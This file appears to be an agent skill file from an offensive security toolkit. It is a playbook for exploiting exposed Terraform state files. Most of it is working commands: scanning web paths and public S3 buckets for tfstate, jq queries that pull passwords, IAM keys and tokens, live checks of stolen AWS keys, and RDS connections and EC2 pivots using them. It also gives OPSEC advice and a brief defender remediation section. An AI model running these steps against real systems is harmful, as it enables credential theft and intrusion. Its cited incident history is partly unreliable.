---
name: terraform-state-leak
description: Exploit exposed Terraform state files — secrets, cloud creds, RDS passwords, IAM keys, and infrastructure topology in plain JSON.
metadata:
  subdomain: cloud
  when_to_use: "terraform state leak secrets tfstate"
  mitre_attack:
    - T1552
    - T1530
---

# Terraform State Leak Exploitation

Terraform's `terraform.tfstate` file is a **plaintext JSON map of every
resource Terraform manages**, including:
- IAM access keys / secret keys
- Database passwords (RDS, ElastiCache, etc.)
- API tokens passed in as variables
- TLS private keys
- Resource IDs / ARNs / topology (great for follow-on attacks)

Best practice is to store it encrypted in S3 with KMS. Misconfigurations
that lead to leaks:
- S3 bucket with `public-read` ACL
- S3 bucket with overly permissive policy
- `terraform.tfstate` in a public Git repo (commit history!)
- Backup `terraform.tfstate.backup` left in webroot
- Jenkins workspace / GH Actions artifact exposing state

## 1. Discover exposed state files
**Web-exposed**:
```bash
# Common paths
for path in '/terraform.tfstate' '/terraform.tfstate.backup' \
            '/.terraform/terraform.tfstate' '/infra/terraform.tfstate' \
            '/deploy/terraform.tfstate' '/scripts/terraform.tfstate'; do
  curl -sf "https://$TARGET$path" -o "/tmp/tf-$(basename $path)" && \
    echo "FOUND: $TARGET$path"
done

# Or scan with feroxbuster
feroxbuster -u "https://$TARGET" -w /tmp/tf-paths.txt \
  -x tfstate,tfstate.backup,tfstate.json
```

**S3-direct**:
```bash
# Public bucket scan
aws s3 ls "s3://$BUCKET/" --no-sign-request --recursive | grep -E '\.tfstate'

# Common bucket-name patterns to enumerate
for prefix in "$ORG-terraform" "$ORG-tfstate" "$ORG-infra-state" \
              "tf-state-$ORG" "$ORG-iac" "terraform-$ORG"; do
  aws s3 ls "s3://$prefix" --no-sign-request 2>&1 | head -3
done
```

**Git-history**:
```bash
# Look for committed-then-removed state in target's public repos
gh search code "terraform.tfstate" --owner "$ORG" --json path,repository

# In a cloned repo
git log --all --full-history -- '*terraform.tfstate*'
git log -p --all --full-history -- '*terraform.tfstate*' | head -200
```

## 2. Parse the state
```bash
# Quick triage
jq '.terraform_version, .resources | length' /tmp/state.tfstate

# Extract every sensitive-looking value
jq -r '.resources[] | .instances[] | .attributes | to_entries[] |
       select(.key | test("password|secret|token|key|credential"; "i")) |
       "\(.key) = \(.value)"' /tmp/state.tfstate > /tmp/tf-secrets.txt

# IAM access keys (specifically)
jq -r '.resources[] | select(.type=="aws_iam_access_key") |
       .instances[] | .attributes |
       "\(.user) AKID:\(.id) SK:\(.secret)"' /tmp/state.tfstate

# RDS passwords
jq -r '.resources[] | select(.type=="aws_db_instance") |
       .instances[] | .attributes | "\(.identifier):\(.username):\(.password)"' \
  /tmp/state.tfstate

# Database connection URLs (often w/ embedded passwords)
jq -r '.resources[] | .instances[] | .attributes |
       to_entries[] | select(.value | tostring | test("://[^:]+:[^@]+@")) |
       .value' /tmp/state.tfstate

# Lambda env vars (often hold secrets)
jq -r '.resources[] | select(.type=="aws_lambda_function") |
       .instances[] | .attributes.environment[]?.variables' /tmp/state.tfstate
```

Decepticon ingest:
```
tfstate_audit("/tmp/state.tfstate")
```

## 3. Topology gold-mine
Beyond raw secrets, the state reveals:
- VPC IDs / subnet IDs / security group IDs / NACL rules
- Route 53 zones + internal DNS names
- All resource ARNs (good for IAM policy targeting later)
- Tags revealing org structure (environment, owner, cost-center)
- KMS key ARNs and aliases
- Lambda function code locations
- ECS task definitions / cluster names
- RDS endpoints + which security group / VPC

This data alone is high-value recon for a follow-on engagement.

## 4. Validate IAM keys
```bash
AWS_ACCESS_KEY_ID=$AKID AWS_SECRET_ACCESS_KEY=$SK aws sts get-caller-identity
# Returns the IAM ARN if valid → confirmed live cred

AWS_ACCESS_KEY_ID=$AKID AWS_SECRET_ACCESS_KEY=$SK aws iam get-user
# Get user details + creation date → know if it's a real human or service
```

Pivot to `aws-iam-enum/SKILL.md` for privesc from here.

## 5. RDS pivot
With password from state:
```bash
ENDPOINT=$(jq -r '.resources[] | select(.type=="aws_db_instance") |
           .instances[] | .attributes.endpoint' /tmp/state.tfstate | head -1)

# Connect (requires network reach — usually need to be in VPC or pivot)
mysql -h $ENDPOINT -u $USER -p$PASSWORD
psql -h $ENDPOINT -U $USER  # PGPASSWORD from state
```

If RDS isn't reachable from your perimeter: launch an EC2 in the same
VPC using IAM keys from state (if the role has ec2:RunInstances), then
hop through it.

## 6. Promote
```
kg_add_node(kind="vulnerability", label="Exposed Terraform state: <url>",
            props={"severity":"critical","secrets_found":<n>})
for each cred:
  kg_add_node(kind="credential", label="<service>:<value>")
  kg_add_edge(src=<vuln>, dst=<cred>, kind="exposes")
```

## OPSEC
- Reading a public bucket / web file leaves logs only at the storage layer (S3 access logs, CloudFront access logs)
- Using IAM keys triggers CloudTrail events (`GetCallerIdentity` is benign but observable)
- Many teams have detections for `*Sandbox*` / `*test*` IAM users being used from new IPs

## CVSS
- IAM access key from state + permissive policy: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = 10.0
- RDS pw + DB has PII: 9.0 (network reach gates)
- Topology disclosure only: Medium 5-6

## Defender remediation
```bash
# Migrate to S3 backend with encryption + versioning
terraform {
  backend "s3" {
    bucket         = "tf-state-$ORG"
    key            = "infra.tfstate"
    region         = "us-east-1"
    encrypt        = true
    kms_key_id     = "arn:aws:kms:...:key/..."
    dynamodb_table = "tf-state-lock"
  }
}

# Verify bucket policy denies public access
aws s3api put-public-access-block --bucket tf-state-$ORG \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# Scan repos for committed state files
git log --all --full-history -- '*tfstate*' && \
  echo "DELETE COMMIT HISTORY containing state files (use BFG repo-cleaner)"
```

## Known exemplars
- 2019: Capital One subsidiary leaked tfstate w/ RDS creds → DB exfil
- 2021: Multiple Fortune-500 had tfstate in public S3 (Detectify scan)
- 2023: GitHub Actions misconfig where tfstate was uploaded as artifact, downloadable without auth
- Pattern: terraform-cli running in CI without explicit `-backend-config=encrypt=true` defaults to local state which lands in artifact storage
